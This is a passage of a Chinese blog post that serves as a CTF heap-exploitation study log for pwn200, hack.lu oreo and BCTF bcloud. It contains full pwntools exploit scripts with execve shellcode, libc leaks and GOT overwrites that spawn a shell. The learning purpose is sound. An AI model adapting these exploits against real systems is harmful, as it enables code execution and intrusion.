+<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210315222308.png" alt="20210315222308"></p>
+<p>大致的思路就是：</p>
+<ul>
+<li>在第一次输入money（存入buf）时构造出一个chunk（方法是覆盖dest），指向输入的这个栈，此时这个区域在计算机的角度就成了一个chunk。</li>
+<li>将这个堆释放再分配，这个区域就变得可控，可以一直控制到返回地址</li>
+<li>因为这些函数是一个调用一个的，所以choose 3，结束了最顶层的函数，就可以返回执行shellcode</li>
+</ul>
+<p>其中exp（下）中传入的id==0x61，意思是伪造fake_chunk的下一个chunk（物理相连）的size。</p>
+<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316223428.png" alt="20210316223428"></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05&quot;</span></span><br><span class="line">p.send(shellcode + <span class="string">&quot;a&quot;</span>*(<span class="number">48</span>-<span class="built_in">len</span>(shellcode)))</span><br><span class="line">rbp = u64(p.recvuntil(<span class="string">&quot;?\n&quot;</span>)[<span class="number">48</span>:<span class="number">48</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(rbp)</span><br><span class="line"></span><br><span class="line">shellcode_addr = rbp - <span class="number">0x50</span></span><br><span class="line">fake_chunk = rbp - <span class="number">0xb0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(shellcode_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;17&quot;</span>)	<span class="comment">#?min==17</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;money~&quot;</span>)</span><br><span class="line"><span class="comment">#payload = &quot;A&quot;*0x8 + &quot;B&quot;*0x10</span></span><br><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">8</span> + p64(<span class="number">0x61</span>) + <span class="string">&quot;\x00&quot;</span>*<span class="number">0x28</span> + p64(fake_chunk)   <span class="comment">#make a fake_chunk here</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;how long?&quot;</span>,<span class="string">&quot;79&quot;</span>)   <span class="comment">#97==0x61</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x38</span> + p64(shellcode_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;money : &quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>多调试！！！</p>
+<h3 id="非HOS">非HOS</h3>
+<p>把dest的值覆盖为free_got，；此时如果buf中为&quot;shellocde_addr&quot;+“\x00”*n，free的got表就指向shellcode，执行free时就相当于执行shellocde</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line">arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">shellcode=<span class="string">&quot;\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05&quot;</span></span><br><span class="line">p.send(shellcode + <span class="string">&quot;a&quot;</span>*(<span class="number">48</span>-<span class="built_in">len</span>(shellcode)))	</span><br><span class="line">rbp = u64(p.recvuntil(<span class="string">&quot;?\n&quot;</span>)[<span class="number">48</span>:<span class="number">48</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(rbp)</span><br><span class="line">shellcode_addr = rbp - <span class="number">0x50</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(shellcode_addr)</span><br><span class="line"><span class="comment"># leak rbp &amp; shellcode_addr</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;111&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;~\n&quot;</span>)</span><br><span class="line">payload = p64(shellcode_addr) + <span class="string">&quot;\x00&quot;</span>*(<span class="number">0x38</span>-<span class="built_in">len</span>(p64(shellcode_addr))) + p64(elf.got[<span class="string">&quot;free&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="2014-hack-lu-oreo">2014 <a target="_blank" rel="noopener" href="http://hack.lu">hack.lu</a> oreo</h2>
+<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331101129.png" alt="20210331101129"></p>
+<p>拖到ida里分析一波，main函数做了个初始化<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331101246.png" alt="20210331101246"><br>
+sub_804898D()里包括了菜单和进入各个功能函数的跳转<br>
+（说个题外话，这题用sendlineafter的话会一直等待after的字符串，不知道为啥…</p>
+<p>嗯，继续</p>
+<p>add：<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331102125.png" alt="20210331102125">add函数做了如下操作：</p>
+<ul>
+<li>开辟0x38大小的空间</li>
+<li>从0x19的位置开始读入最长为0x38的字符串，并在末尾\0</li>
+<li>从起始位置读入长度为0x38的字符串，并在末尾\0</li>
+<li>add_not_order_num+1</li>
+</ul>
+<p>show_add:<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331102328.png" alt="20210331102328"></p>
+<p>order：<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331102253.png" alt="20210331102253"></p>
+<p>bss段：<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331130920.png" alt="20210331130920"></p>
+<p>整理一下这三个函数，大概能判断出枪支chunk的样子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">size</span><br><span class="line">describtion 	<span class="comment">//size = 0x19</span></span><br><span class="line">name	<span class="comment">//size = 0x1F</span></span><br><span class="line">pre_chunk_ptr</span><br></pre></td></tr></table></figure>
+<p>cut_input:<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331102416.png" alt="20210331102416"><br>
+其实就是一个把字符串末尾置为\0…再和add函数的输入部分判断一下，明显有点不安全啊…</p>
+<p>大概的思路：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 在add时溢出伪造指向前一个chunk的指针指向puts_got，调用show_add时就可以泄露puts的地址，获得system的地址</span><br><span class="line">接下来就只需要修改某个函数的got表指向的内容然后试着执行/bin/sh，而要做到这个需要：</span><br><span class="line">2. 把某段内存变成完全可控的chunk，且大小需要满足malloc(0x38)。看了看bss段，发现&quot;.bss:0804A2A8 order_mesg_ptr&quot;好像满足要求，而且这个位置前后也没啥用 </span><br><span class="line">3. 获得了可控的地址后寻找可以篡改的函数got，且要能执行输入的/bin/sh字符串</span><br></pre></td></tr></table></figure>
+<p>第一步比较好解决：<br>
+用gdb add出两个chunk，数一下就能知道payload该填多少trash<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331165524.png" alt="20210331165524"></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">27</span> + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">add(payload,<span class="string">&quot;aaa&quot;</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Description: aaa\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Description: &quot;</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line">sys = puts_addr - <span class="number">0x24f00</span></span><br></pre></td></tr></table></figure>
+<p>第二步，想要在bss段上构造一个chunk（如下图）的话，</p>
+<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331183238.png" alt="20210331183238"><br>
+（另外还要把order_mesg_ptr看作chunk的size，置为0x40）</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> a&lt;<span class="number">0x3f</span>:</span><br><span class="line">	add(<span class="string">&quot;aa&quot;</span>,<span class="string">&quot;aa&quot;</span>)</span><br><span class="line">	a+=<span class="number">1</span></span><br><span class="line"><span class="comment">#0x3f and leave one here</span></span><br><span class="line">fake_chunk = <span class="number">0x0804A2A8</span></span><br><span class="line">add(<span class="string">&quot;1&quot;</span>*<span class="number">27</span>+p32(fake_chunk),<span class="string">&quot;aaaa&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>是很明显的。<br>
+但如何能让这块区域能够使用就要考虑free时对next_chunk的判断：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">0x20</span> + <span class="string">&quot;a&quot;</span>*<span class="number">4</span> + p32(<span class="number">100</span>)</span><br><span class="line">add_message(payload)</span><br></pre></td></tr></table></figure>
+<p>此时order()后，fastbin接收的（唯一一个）chunk将在下一次malloc时分配出去<br>
+随后修改strlen指向的地址就能在cut_input()时getshell</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(elf.got[<span class="string">&#x27;strlen&#x27;</span>]).ljust(<span class="number">20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="string">&quot;aaa&quot;</span>,payload)</span><br><span class="line">add_message(p32(sys)+<span class="string">&#x27;;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># system(p32(system_addr);&quot;/bin/sh&quot;) = system(p32(system_addr));system(&quot;/bin/sh&quot;);</span></span><br></pre></td></tr></table></figure>
+<p>另：写一半把ida关了，且没保存数据orz，所以最后就写的比较快且没有截图了…</p>
+<p>参考：<br>
+<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-247214.htm">https://bbs.pediy.com/thread-247214.htm</a><br>
+<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack/#2014-hacklu-oreo">https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack/#2014-hacklu-oreo</a></p>
+<h1>House of Force</h1>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">利用条件:</span><br><span class="line">- 能够以溢出等方式修改top chunk的size域</span><br><span class="line">- 自由控制堆分配的大小</span><br><span class="line"></span><br><span class="line">步骤:</span><br><span class="line">1. malloc(100)//随便分配一个chunk</span><br><span class="line">2. 使用溢出修改top chunk的size为一个大数//不会去调用mmap</span><br><span class="line">3. malloc(size)//size=目标地址减去 top chunk 地址，再减去 chunk 头的大小</span><br><span class="line">4. p = malloc(100); p == 目标地址</span><br><span class="line"></span><br><span class="line">摘自0x2l师傅的文章</span><br></pre></td></tr></table></figure>
+<h2 id="题">题</h2>
+<h3 id="HITCON-TRAININGLAB-11">HITCON TRAININGLAB 11</h3>
+<p>略…<br>
+相关记录在2021-03-22的日报里</p>
+<h3 id="BCTF-bcloud">BCTF-bcloud</h3>
+<p>搞了好久…现在是早上五点，不想写了<br>
+注释啥的都在exp和ida文件里<br>
+有两种方法，主要是把top_chunk指向bss段的content_ptr或content_len，由此可以在里边任意写，更改函数got表指向的内容。</p>
+<p>画图和调试很重要！</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./bcloud&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bcloud&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span> (<span class="params"><span class="built_in">len</span>, content</span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;content:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Input the content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Input the id:\n&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Input the id:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Input the new content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;name:\n&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x40</span>)</span><br><span class="line">first_heap = u32(p.recv()[<span class="number">68</span>:<span class="number">4</span>+<span class="number">68</span>].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">8</span> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base: &quot;</span> + <span class="built_in">hex</span>(first_heap)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;A&quot;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Host:\n&quot;</span>,p32(<span class="number">0xffffffff</span>))</span><br><span class="line">topchunk_addr = first_heap + <span class="number">0x48</span>*<span class="number">3</span>			<span class="comment">#这里第一次时候因为看gdb显示每个chunk大小是0x49，就写了0x49*3，但其实那个size应该是包括了pre_use的，因此是0x48</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;topchunk_addr : &quot;</span> + <span class="built_in">hex</span>(topchunk_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">content_ptr = <span class="number">0x0804B120</span></span><br><span class="line">content_len = <span class="number">0x0804B0A0</span></span><br><span class="line"></span><br><span class="line">target_addr = content_len - <span class="number">8</span>		<span class="comment">#?</span></span><br><span class="line">off_target = target_addr - topchunk_addr</span><br><span class="line">malloc_size = off_target - <span class="number">4</span> -<span class="number">7</span>		<span class="comment">#??</span></span><br><span class="line"></span><br><span class="line">add(malloc_size -<span class="number">4</span> , <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;malloc_size : &quot;</span> + <span class="built_in">hex</span>(malloc_size) + <span class="string">&quot;\ntarget_addr : &quot;</span> + <span class="built_in">hex</span>(target_addr)</span><br><span class="line"><span class="comment"># now, topchunk_addr -&gt; content_len-8	?</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关于这个topchunk指向的问题，上下两种方法在调试时，试了malloc几个相近的大小（±0x10），pwndbg的topchunk都指向0x804b000，在后面分配时也没有显示增加了chunk</span></span><br><span class="line"><span class="comment"># 目前还不知道是为啥...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">16</span>)*<span class="number">3</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*(content_ptr - content_len -<span class="number">12</span>) </span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p32(elf.got[<span class="string">&#x27;atoi&#x27;</span>])*<span class="number">2</span></span><br><span class="line"><span class="comment">#create 3 contents, with len==16, contents = free_got_addr, atoi_got_addr, ~</span></span><br><span class="line">add(<span class="number">1000</span>,payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line"><span class="comment">#free_got points to puts_plt</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)		<span class="comment">#puts no.1&#x27;s content, which is atoi_got_addr</span></span><br><span class="line">atoi_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;atoi_addr: &quot;</span> + <span class="built_in">hex</span>(atoi_addr)</span><br><span class="line">offset = atoi_addr - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">sys_addr = offset + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p32(sys_addr))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;option---&gt;&gt;\n&quot;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#泄露puts</span></span><br><span class="line"><span class="comment">## 前面与↑相同</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">content_ptr = <span class="number">0x0804B120</span></span><br><span class="line">content_len = <span class="number">0x0804B0A0</span></span><br><span class="line">target_addr = content_ptr </span><br><span class="line">malloc_size = target_addr - topchunk_addr -<span class="number">0x10</span></span><br><span class="line">add(malloc_size, <span class="string">&#x27;junk&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;malloc_size : &quot;</span> + <span class="built_in">hex</span>(malloc_size) + <span class="string">&quot;\ntarget_addr : &quot;</span> + <span class="built_in">hex</span>(target_addr)</span><br><span class="line"><span class="comment"># topchunk -&gt; content_ptr - 0x8</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下部分用gdb查看内存中的内容比较容易搞懂</span></span><br><span class="line">payload = p32(<span class="number">0</span>) + p32(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p32(<span class="number">0x804b130</span>) + <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>,payload )</span><br><span class="line">edit(<span class="number">1</span>,p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))    <span class="comment">#修改free_got为puts_plt</span></span><br><span class="line">delete(<span class="number">2</span>)   <span class="comment">#输出puts_addr</span></span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;puts: &quot;</span> + <span class="built_in">hex</span>(puts_addr)</span><br><span class="line">sys_addr = puts_addr - <span class="number">0x24f00</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p32(sys_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>做这题的时候感觉很奇怪。首先是第一种泄露atoi的方法，似乎只在给定libc的时候有效，把获得的atoi的地址放进libc database里查的时候查不到对应的libc…而第二种泄露puts的方法就可以正常getshell</p>
+<p>参考：<br>
+<a target="_blank" rel="noopener" href="https://my.oschina.net/u/4347688/blog/3561765">一</a><br>
+<a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/105588058">二</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%AD%A6%E4%B9%A0/" rel="tag"># 学习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/21992.html" rel="prev" title="堆学习">
+                  <i class="fa fa-chevron-left"></i> 堆学习
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/35069.html" rel="next" title="一个自动验证多个弱密码的脚本（含验证码识别）">
+                  一个自动验证多个弱密码的脚本（含验证码识别） <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bruce</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9943095847270020"
+     crossorigin="anonymous"></script>
+<!-- 1 -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-9943095847270020"
+     data-ad-slot="9629035599"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.18/dist/katex.min.css" integrity="sha256-M6KFoDq9eUpmogkDgw6+3R3ZgUPSuFXnQyr8tskSfQs=" crossorigin="anonymous">
+
+
+
+</body>
+</html>
